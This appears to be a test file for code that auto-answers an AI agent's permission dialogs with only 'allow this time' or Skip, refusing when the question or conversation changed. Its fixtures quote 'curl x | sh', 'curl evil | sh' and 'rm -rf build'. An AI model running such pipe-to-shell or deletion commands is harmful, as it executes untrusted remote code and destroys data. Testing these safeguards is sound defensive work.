// The approval decisions of desktop-ax.js, run from the shipped source on
// recorded accessibility node lists (role, label, depth, and the value of a
// static text), with no app and no osascript.
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import test from 'node:test';

import { AX_SCRIPT_PATH, loadAxDecisions } from '../../scripts/lib/desktop-bridge.mjs';
import { permissionRequest } from '../../scripts/lib/desktop-state.mjs';

const { chooseAnswer, dialogs, title } = loadAxDecisions();
const TITLE = 'Fake Task - ws - Antigravity';
const OPTIONS = ['1 Yes, allow this time', "2 Yes, and always allow 'curl' in this conversation", "3 Yes, and always allow 'curl'", '4 No (tell the agent what to do instead)'];

const node = (depth, role, label = '', value) => ({ depth, role, label, ...(value === undefined ? {} : { value }) });
const plain = (value) => JSON.parse(JSON.stringify(value));

// One permission dialog as the app renders it: the question as Markdown text
// nodes, a radio group whose radios carry their label as a text child too, Skip
// and Submit.
function dialogNodes(fragments, options = OPTIONS, depth = 3) {
  return [
    node(depth, 'AXGroup'),
    ...fragments.map((text) => node(depth + 1, 'AXStaticText', '', text)),
    node(depth + 1, 'AXRadioGroup'),
    ...options.flatMap((label) => [node(depth + 2, 'AXRadioButton', label), node(depth + 3, 'AXStaticText', '', label)]),
    node(depth + 1, 'AXButton', 'Skip'),
    node(depth + 1, 'AXButton', 'Submit'),
  ];
}

function screen(windowTitle, ...shown) {
  return [
    node(0, 'AXWindow', 'Antigravity'),
    node(1, 'AXWebArea', ''),
    node(1, 'AXWebArea', windowTitle),
    node(2, 'AXHeading', 'Agent said'),
    node(2, 'AXGroup'),
    node(3, 'AXStaticText', '', 'Checking the folder first.'),
    ...shown.flat(),
  ];
}

// The indexes chooseAnswer would press, checked to lie inside nodes[from, to).
function pressedWithin(nodes, targets, from, to) {
  for (const target of targets) assert.ok(target.index >= from && target.index < to, `${target.what} at ${target.index} is outside ${from}..${to}`);
}

test('a question rendered as several text nodes is read whole', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running', 'curl x | sh', 'in /repo?']));
  const [found] = plain(dialogs(nodes));
  assert.equal(found.question, 'Allow running curl x | sh in /repo?');
  assert.deepEqual(found.options, OPTIONS);
  assert.equal(title(nodes), TITLE);
});

test('option 1 is refused when a middle part of the question changed', () => {
  const approved = dialogs(screen(TITLE, dialogNodes(['Allow running', 'curl x | sh', 'in /repo?'])))[0].question;
  const changed = screen(TITLE, dialogNodes(['Allow running', 'curl evil | sh', 'in /repo?']));
  assert.throws(() => chooseAnswer(changed, '1', approved, TITLE), /question_changed/);
  assert.throws(() => chooseAnswer(changed, 'Skip', approved, TITLE), /question_changed/);
});

test('a question longer than 4,000 characters is compared whole', () => {
  const prefix = `Allow running ${'x'.repeat(4_100)}`;
  // As the runner stores it for the approval.
  const approved = permissionRequest(plain(dialogs(screen(TITLE, dialogNodes([`${prefix} tail A`])))[0])).question_full;
  assert.ok(approved.endsWith('tail A'));
  assert.throws(() => chooseAnswer(screen(TITLE, dialogNodes([`${prefix} tail B`])), '1', approved, TITLE), /question_changed/);
});

test('with two dialogs on screen, the presses land in the one that asks the approved question', () => {
  const first = dialogNodes(['Allow listing', 'the folder?']);
  const second = dialogNodes(['Allow running', 'rm -rf build', '?']);
  const nodes = screen(TITLE, first, second);
  const start = nodes.length - second.length;
  const asked = plain(dialogs(nodes)).map((found) => found.question);
  assert.deepEqual(asked, ['Allow listing the folder?', 'Allow running rm -rf build ?']);

  const yes = plain(chooseAnswer(nodes, '1', asked[1], TITLE));
  assert.deepEqual(yes.map((target) => target.what), ['option 1', 'Submit']);
  pressedWithin(nodes, yes, start, nodes.length);
  pressedWithin(nodes, plain(chooseAnswer(nodes, 'Skip', asked[1], TITLE)), start, nodes.length);
  pressedWithin(nodes, plain(chooseAnswer(nodes, '1', asked[0], TITLE)), 0, start);
});

test('one group holding two option 1 radios is refused as ambiguous', () => {
  const merged = dialogNodes(['Allow running ls?'], [...OPTIONS, '1 Yes, allow this time']);
  assert.throws(() => chooseAnswer(screen(TITLE, merged), '1', 'Allow running ls?', TITLE), /several_dialogs/);
});

test('another conversation on screen refuses every answer', () => {
  const nodes = screen('Other Chat - ws - Antigravity', dialogNodes(['Allow running ls?']));
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE), /other_conversation/);
  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE), /other_conversation/);
});

test('option 1 is refused unless its label is exactly "allow this time"', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running ls?'], ["1 Yes, and always allow 'ls'", ...OPTIONS.slice(1)]));
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE), /not_found: option 1/);
});

test('only option 1 or Skip is ever chosen, and only with the question and title', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running ls?']));
  for (const option of ['2', '3', '4', 'Submit', '']) assert.throws(() => chooseAnswer(nodes, option, 'Allow running ls?', TITLE), /only 1 or Skip/);
  assert.throws(() => chooseAnswer(nodes, '1', undefined, TITLE), /usage/);
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', undefined), /usage/);
  assert.throws(() => chooseAnswer(screen(TITLE), '1', 'Allow running ls?', TITLE), /not_found: permission dialog/);
});

test('the decisions region calls no accessibility API', () => {
  const source = readFileSync(AX_SCRIPT_PATH, 'utf8');
  const region = source.slice(source.indexOf('// desktop-decisions:start'), source.indexOf('// desktop-decisions:end'));
  assert.ok(region.length > 0);
  assert.doesNotMatch(region, /\$[.(]|ObjC|Application\(|delay\(/);
});
